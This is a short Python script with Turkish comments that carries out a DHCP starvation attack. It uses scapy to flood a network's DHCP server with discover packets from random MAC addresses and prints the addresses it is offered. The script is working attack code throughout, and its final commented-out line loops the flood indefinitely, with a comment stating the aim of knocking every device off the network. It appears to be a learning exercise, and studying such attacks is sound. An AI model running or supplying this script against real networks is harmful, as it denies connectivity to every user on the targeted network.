# DHCP tüketme saldırısı yapma

# Random bir mac adresinden Dhcp sunucusuna istek(request) atılır, ip almak için
# Request,discover paketleri gönderiyoruz - DHCP discover paketleri gider , sunucudan ise OFFER paketleri dönecektir

# IP bırakma komutu (internetten kopma) : $sudo dhclient -r
# Sonra tekrar bağlama : $ sudo dhclient

from scapy.all import *


conf.checkIPaddr = False

ether = Ether (dst = 'ff:ff:ff:ff:ff:ff')
ip = IP (src="0.0.0.0" , dst="255.255.255.255")

udp = UDP (sport=68 , dport=67)
bootp= BOOTP(op =1 , chaddr=RandMAC() )
dhcp = DHCP ( options= [("message-type","discover"),"end" ])

dhcp_discover = ether/ip/udp/bootp/dhcp

# ans , unas = srp ( dhcp_discover , iface='eth0' , verbose=False)


for i in range (10):
	ans , unas = srp ( dhcp_discover , iface='eth0' , verbose=False)

	for p in ans:
		print ( p[1].dst , ":" , p[1].yiaddr)



# Sonsuz döngüde loop ile çok fazla istek yollama ve tüm cihazları netten koparmak için

# sendp( dhcp_discover, iface='eth0' , verbose=False , loop=1)